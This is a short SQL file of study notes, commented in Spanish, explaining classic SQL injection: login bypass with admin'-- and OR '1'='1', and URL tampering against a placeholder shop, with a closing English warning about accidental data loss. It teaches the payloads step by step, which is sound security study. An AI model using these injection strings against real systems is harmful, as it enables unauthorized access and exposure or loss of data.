SELECT * FROM users
WHERE username = 'username' AND password = 'password';

-- si el hacker ingresa admin'--', entonces quedaria:
SELECT * FROM users
WHERE username = 'admin'--' AND password = 'password';
-- como podemos ver, se comenta la parte del password...
-- entonces la query devuelve el user, y el atacante logro ingresar...

-- o, por ejemplo (admin' OR '1' = '1):
SELECT * FROM users
WHERE username = 'admin' OR '1' = '1';
-- con esto, podemos obtener todos los usuarios



-- otro ejemplo:
-- la url: https://insecure-website.com/products?category=Gifts
-- Resulta en la query SQL:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-- si la modificamos a: https://insecure-website.com/products?category=Gifts'--
-- tendremos:
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
-- modificando la query, y obteniendo todos los productos, liberados y no liberados

-- o tambien:
-- modificamos la url por: https://insecure-website.com/products?category=Gifts' OR 1=1--
-- resultando en:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-- esto devuelve todos los productos de todas las categorias

/*
Take care when injecting the condition OR 1=1 into a SQL query.
Even if it appears to be harmless in the context you're injecting into,
it's common for applications to use data from a single request in multiple different queries.
If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.
*/
